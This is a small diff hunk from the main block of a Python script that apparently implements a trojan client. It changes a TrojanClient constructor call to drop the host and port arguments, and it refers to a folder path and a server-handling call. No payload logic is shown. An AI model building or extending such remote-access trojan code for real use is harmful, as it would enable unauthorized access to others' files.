@@ -143,5 +143,5 @@ if __name__ == "__main__":
     FOLDER = "D:\check"
 
     SecureSocketClient()
-    client = TrojanClient(HOST, PORT, FOLDER)
+    client = TrojanClient(FOLDER)
     client.handle_server()
